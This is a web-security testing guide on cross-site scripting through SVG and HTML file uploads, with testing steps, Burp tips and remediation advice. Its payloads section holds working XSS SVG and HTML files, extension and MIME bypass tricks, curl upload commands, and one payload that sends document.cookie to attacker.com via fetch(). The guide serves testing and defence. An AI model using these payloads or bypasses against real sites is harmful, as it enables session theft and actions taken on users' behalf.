# XSS via SVG / HTML File Upload

## Overview
SVG (Scalable Vector Graphics) files are XML-based images that can contain embedded JavaScript within `<script>` elements and event handlers. When an application allows SVG file uploads and serves them directly from the same origin (or a non-sandboxed origin), the embedded scripts execute in the browser with full access to the serving domain's context. HTML file uploads pose the same risk. This makes SVG/HTML uploads one of the most reliable XSS attack vectors, bypassing many client-side input filters since the payload is in a file rather than a URL parameter.

## How It Works
An attacker uploads a crafted SVG file through any file upload mechanism (avatar, attachment, document import, etc.). If the server stores and serves the file with `Content-Type: image/svg+xml` or without a restricting `Content-Disposition: attachment` header from the same origin, the browser renders it as an active document. Any `<script>` block or event handler within the SVG executes immediately. Because the file is served from the target domain, the JavaScript has the same-origin access to cookies and can make authenticated requests on behalf of the viewing user. HTML files uploaded as "documents" or "templates" operate identically.

## Impact
- JavaScript execution in the context of the application's origin
- Session cookie theft (if HttpOnly is not set)
- Authenticated actions on behalf of the victim
- DOM access to other pages on the same origin (if user navigates)
- Stored XSS with minimal server-side filtering bypass
- Exploitation even when URL-based XSS is fully blocked

## Where to Look
- Avatar / profile picture upload fields
- Image upload for posts, articles, product listings
- Document/attachment upload in messaging or collaboration tools
- Import functionality (SVG import for design tools, vector editors)
- Thumbnail or image processing endpoints
- File managers and media libraries
- CMS media upload pages
- Support ticket attachment upload
- Any endpoint where users can upload files that are then served via a URL on the same domain

## Testing Steps
1. Identify all file upload endpoints in the application.
2. Create a minimal SVG XSS file (see Payloads section) and attempt to upload it.
3. If the upload succeeds, navigate to the URL where the file is served.
4. Check the response `Content-Type` header — if it is `image/svg+xml` or `text/html`, the browser will render it actively.
5. Check whether the file is served with `Content-Disposition: attachment` — if so, it triggers a download rather than rendering.
6. If upload is rejected based on extension, try double extensions: `.svg.jpg`, `.SVG`, `file.svg%00.jpg`.
7. If upload is rejected based on content, try bypassing with polyglot files or obfuscated SVG payloads.
8. Test whether the application serves the SVG from the same origin or a sandboxed CDN subdomain.
9. If served from a CDN, determine if cookies are shared with the CDN subdomain (less likely to be exploitable).
10. Confirm execution by verifying the alert or callback fires when the SVG URL is visited.

## Payloads / Techniques

**Minimal XSS SVG payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**SVG with event handler (avoids `<script>` tag filter):**
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
  <circle cx="50" cy="50" r="40"/>
</svg>
```

**SVG with foreign object (HTML embedded in SVG):**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(document.cookie)</script>
    </body>
  </foreignObject>
</svg>
```

**SVG with animate element:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <animate attributeName="x" values="0;1" onbegin="alert(1)"/>
</svg>
```

**SVG with image element and event:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="x" onerror="alert(1)"/>
</svg>
```

**SVG with cookie exfiltration:**
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/?c='+document.cookie)">
</svg>
```

**HTML file upload XSS:**
```html
<!DOCTYPE html>
<html>
<body>
<script>alert(document.domain)</script>
</body>
</html>
```

**Polyglot SVG/GIF (magic bytes bypass):**
Create a file starting with the GIF magic bytes but containing SVG content:
```
GIF89a<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
```

**cURL upload test:**
```bash
curl -F "file=@xss.svg;type=image/svg+xml" https://victim.com/upload
curl -F "avatar=@xss.svg;type=image/jpeg" https://victim.com/profile/avatar
# Try with different MIME type if svg is blocked:
curl -F "file=@xss.svg;type=image/png" https://victim.com/upload
```

**Double extension bypass:**
Save the file as `xss.jpg.svg`, `xss.svg.jpg`, or `xss%00.jpg` (null byte) to bypass extension filters.

## Burp Suite Tips
- Use **Burp Repeater** to resend upload requests with the file content replaced by your SVG payload — change just the `Content-Type` and `filename` parameters.
- Intercept the upload in **Burp Proxy** and use **"Send to Repeater"** to iterate over extension and MIME type bypasses.
- After successful upload, use **Burp's browser** to navigate to the file URL and observe whether execution occurs.
- Use the **Upload Scanner** Burp extension for automated polyglot and bypass testing across file upload endpoints.
- Check the `Content-Type` of the served file in Burp's HTTP history — filter by the domain where uploads are served.
- Test the upload endpoint with **Intruder** using a list of MIME types and extensions to find which combinations bypass server-side checks.
- Use **Burp Collaborator** in the SVG payload for blind/OOB execution confirmation.

## Tools
- Burp Suite Pro (Upload Scanner extension)
- Upload Scanner — https://github.com/modzero/mod0BurpUploadScanner
- ExifTool (embed XSS in metadata for reflected in EXIF display pages)
- ImageMagick (create polyglot image/SVG files)
- svgbomb — manual crafting of malicious SVGs
- Caido / OWASP ZAP for upload fuzzing

## Remediation
- **Serve uploads from a separate sandboxed domain**: Host user-uploaded files on a dedicated domain (e.g., `static.example.com`) with no shared cookies with the main application. Ensure the CSP for that domain is strict.
- **Force Content-Disposition: attachment**: For all uploaded files, serve them with `Content-Disposition: attachment; filename="..."` to force download rather than browser rendering.
- **Validate file content (magic bytes)**: Verify the file's actual content (magic bytes / file signature) matches the expected type — do not rely solely on extension or Content-Type.
- **Re-encode images**: Convert uploaded images using a server-side image processing library (Pillow, ImageMagick) to strip any embedded XML/SVG/scripts. Re-saving a rasterized image destroys embedded code.
- **Disallow SVG uploads**: If SVG is not required, block the `image/svg+xml` MIME type and `.svg` extension entirely.
- **Use a strict CSP**: On the file-serving domain, deploy `Content-Security-Policy: default-src 'none'` to prevent script execution.
- **Sanitize SVG**: If SVG uploads are required, use a server-side SVG sanitizer (e.g., SVG Sanitizer in PHP, svg-sanitizer in Node.js) to strip script elements and event handlers.

## References
https://portswigger.net/web-security/file-upload
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
https://portswigger.net/research/svg-hijacking
https://developer.mozilla.org/en-US/docs/Web/SVG/Element/script
